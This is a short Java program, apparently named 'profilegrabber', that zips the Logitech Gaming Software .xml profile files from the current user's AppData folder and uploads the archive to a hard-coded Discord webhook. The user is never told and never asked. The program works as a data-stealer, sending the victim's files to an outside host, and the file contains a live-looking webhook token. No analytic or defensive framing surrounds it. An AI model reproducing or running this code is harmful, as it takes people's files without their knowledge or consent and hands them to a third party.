package profilegrabber;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.HttpClients;

public class Main {
    public static void main(String[] args) {
    	
    	String username = System.getProperty("user.name");
        String sourceFolderPath = "C:\\Users\\" + username + "\\AppData\\Local\\Logitech\\Logitech Gaming Software\\profiles";
    	
        String webhookURL = "https://discord.com/api/webhooks/1139578177472172153/2hHeotaa7iwhIPS4PD8tUBQDOlMgRZHnVgvA7SKqCs6OCC4edzkVd6g36Usr633Ik3pR";
        String zipFilePath = "C:\\Users\\" + username + "\\AppData\\Roaming\\Profiles.zip";
        String ID = "why1337";

        try {
            File zipFile = new File(zipFilePath);
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zipOut = new ZipOutputStream(fos);

            File sourceFolder = new File(sourceFolderPath);

            addFilesToZip(sourceFolder, zipOut);

            zipOut.close();
            fos.close();

            DiscordWebhookUtil.uploadFile(webhookURL, zipFile);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void addFilesToZip(File folder, ZipOutputStream zipOut) throws IOException {
        for (File file : folder.listFiles()) {
            if (file.isFile() && file.getName().toLowerCase().endsWith(".xml")) {
                FileInputStream fis = new FileInputStream(file);
                ZipEntry zipEntry = new ZipEntry(file.getName());
                zipOut.putNextEntry(zipEntry);

                byte[] bytes = new byte[1024];
                int length;
                while ((length = fis.read(bytes)) >= 0) {
                    zipOut.write(bytes, 0, length);
                }

                zipOut.closeEntry();
                fis.close();
            }
        }
    }
}

class DiscordWebhookUtil {
    public static void uploadFile(String webhookURL, File file) throws IOException {
    	HttpClient httpClient = HttpClients.createDefault();
        HttpPost httpPost = new HttpPost(webhookURL);

        MultipartEntityBuilder builder = MultipartEntityBuilder.create();
        builder.addBinaryBody("file", file, ContentType.APPLICATION_OCTET_STREAM, file.getName());

        HttpEntity multipart = builder.build();
        httpPost.setEntity(multipart);

        HttpResponse response = httpClient.execute(httpPost);
    }
}
